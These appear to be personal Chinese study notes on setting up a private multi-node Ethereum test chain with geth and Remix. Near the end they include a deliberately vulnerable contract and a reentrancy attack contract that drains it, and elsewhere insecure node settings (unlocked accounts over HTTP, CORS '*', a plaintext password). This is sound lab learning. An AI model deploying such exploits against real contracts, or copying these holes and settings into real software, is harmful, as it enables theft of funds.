安装ubuntu：https://blog.csdn.net/qq_43374681/article/details/129248167

ubuntu联网：https://blog.csdn.net/xuqingda/article/details/124033331

无法复制粘贴记得下vmware tool 可以在网页搜索如何下载

记得更新软件更新以及配置联网环境

安装geth（新版本可能会有后续personal.newAccount命令废用等问题）
https://www.jianshu.com/p/beb3422d939c
从github下载geth 1.10.3 tar 包：wget https://github.com/ethereum/go-ethereum/archive/refs/tags/v1.10.3.tar.gz
解压geth：tar -xvf v1.10.3.tar.gz
编译geth：
cd go-ethereum-1.10.3/
make geth
（如果含有...../build/bin:permission denied ）则在终端输入：sudo chmod -R 777 build/
再次make geth即可 
把geth 添加到ubuntu环境变量
# 打开文件
vim /etc/profile
# 将最后一行粘贴,/root/go-ethereum-1.10.3/build/bin 换成你的路径
export PATH=/root/go-ethereum-1.10.3/build/bin:$PATH
# 重新刷新，使其立即生效
source /etc/profile    
# 使用 geth version 验证
或者
配置环境变量：sudo vim ~/.bashrc
export ETHPATH=/usr/local/go-ethereum/build/bin
export PATH=$ETHPATH:$PATH
文件生效：source ~/.bashrc

配置go环境：
https://ping.chinaz.com/http://dl-ssl.google.com
https://www.cnblogs.com/tc310/p/9202298.html
sudo gedit /etc/hosts
#Download 下载
120.253.253.33 dl.google.com
74.125.203.190 dl-ssl.google.com

 #Groups
203.208.46.146 groups.google.com

 #Google URL Shortener
203.208.46.146 goo.gl

 #Google App Engine
203.208.46.146 appengine.google.com

 #Android Developer
74.125.113.121 developer.android.com
wget https://golang.google.cn/dl/go1.19.2.linux-amd64.tar.gz -O - | sudo tar -xz -C /usr/local

打开文件为vim ~/.bashrc   可能未安装vim需下载
添加环境变量时需注意lyan为用户名，所以我的用户名为sandra所以用sandra替换lyan
还需要保证root权限能执行go命令
sudo vim /etc/profile
#在最后一行添加
export PATH=$PATH:/usr/local/go/bin

/*先安装brew：
sudo apt-get install build-essential procps curl file git
-c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
下载完成后在终端：
echo 'eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"' >> $HOME/.bash_profile
eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"
然后进行brew命令检验：
brew doctor*/

安装Truffle
npm install -g truffle

.json
{
"nonce":"0x0000000000000042",


"mixhash":"0x0000000000000000000000000000000000000000000000000000000000000000",


"difficulty": "0x4000",


"alloc": {},


"coinbase":"0x0000000000000000000000000000000000000000",


"timestamp": "0x00",

"parentHash":"0x0000000000000000000000000000000000000000000000000000000000000000",


"extraData": "0x00000000",


"gasLimit":"0xffffffff",

"config":{
"chainId": 666,
"homesteadBlock": 0,
"eip155Block": 0,
"eip158Block": 0
}
}

建立多节点以太坊私有链
在文档里通过建立空文档data0来初始化创世区块后进行一定操作，则多节点也是建立空文档类似data1来进行相同操作
然后通过文档节点连接方法进行节点之间的互通

data0建立
geth --datadir data1 init genesis.json
geth --http --http.corsdomain="https://ide.remix-project.cn" --http.api web3,eth,debug,personal,net --vmdebug --datadir data1 --port 30301 --authrpc.port 8551 --networkid 1108 --http.port 8001 --nodiscover --allow-insecure-unlock

http://remix.zhiguxingtu.com
geth --http --http.corsdomain="http://remix.zhiguxingtu.com" --http.api web3,eth,debug,personal,net --vmdebug --datadir data1 --port 30301 --networkid 1108 --http.port 8485 --nodiscover --allow-insecure-unlock console
geth attach ipc:geth.ipc
personal.newAccount()
data0账号："0x64555268f4878796f250c4edc18209ab76d2b928"
admin.nodeInfo.enode
admin.addPeer()
personal.unlockAccount(eth.accounts[1],"dees",30000)

data1建立
geth --datadir data2 init genesis.json
geth --http --http.corsdomain="https://ide.remix-project.cn" --http.api web3,eth,debug,personal,net --vmdebug --datadir data2 --port 30302 --authrpc.port 8552 --networkid 1108 --http.port 8002 --nodiscover --allow-insecure-unlock console
（相较文档去除--authrpc.port 8552在1.8.13旧版本未看到相应参数，去除后可以正常运行）
data1账号："0xf31ddb87904a59095b2f40c314ae73303b80ef15"
personal.unlockAccount(eth.accounts[0])
eth.getBalance(eth.accounts[0])






智能合约发布
abi=[{"inputs":[],"name":"retrieve","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{ "internalType":"uint256","name":"num","type":"uint256"}],"name":"store","outputs":[],"stateMutability":"nonpayable","type":"function"}]
bytecode="0x608060405234801561001057600080fd5b50610150806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80632e64cec11461003b5780636057361d14610059575b600080fd5b610043610075565b60405161005091906100d9565b60405180910390f35b610073600480360381019061006e919061009d565b61007e565b005b60008054905090565b8060008190555050565b60008135905061009781610103565b92915050565b6000602082840312156100b3576100b26100fe565b5b60006100c184828501610088565b91505092915050565b6100d3816100f4565b82525050565b60006020820190506100ee60008301846100ca565b92915050565b6000819050919050565b600080fd5b61010c816100f4565b811461011757600080fd5b5056fea26469706673582212209a159a4f3847890f10bfb87871a61eba91c5dbf5ee3cf6398207e292eee22a1664736f6c63430008070033"

mycontract=contract.new({from:eth.accounts[0],data:bytecode,gas:1000000})






0.6.12
网址：https://ide.remix-project.cn/
contract Token {
    mapping(address => uint) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        uint amount = balances[msg.sender];
        require(amount > 0);
        msg.sender.call.value(amount)("");
        balances[msg.sender] = 0;
    }
}

contract Attack {
    Token public instance;
    
    constructor(address _addr) public {
        instance = Token(_addr);
    }
    
    function attack() external payable {
        instance.deposit.value(1 ether)();
        instance.withdraw();
    }
    
    function balanceSelf() public returns(uint256) {
        return address(this).balance;
    }
    
    fallback() external payable {
    if (address(instance).balance >= 1 ether)
        instance.withdraw();
}
}

0.6.11
contract TokenContract {
    mapping (address => uint256) public balanceOf;

    constructor(uint256 initialSupply) public {
        balanceOf[msg.sender] = initialSupply;
    }

    function transfer(address _to, uint256 _value) public {
        require(balanceOf[msg.sender] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
    }
}



geth --datadir data1 --networkid 1000 --http --http.port 8545 --http.api 'web3,eth,net,debug,personal' --http.corsdomain '*' console --allow-insecure-unlock
geth --datadir data2 --networkid 1001 --http --http.port 8546 --http.api 'web3,eth,net,debug,personal' --http.corsdomain '*' console --allow-insecure-unlock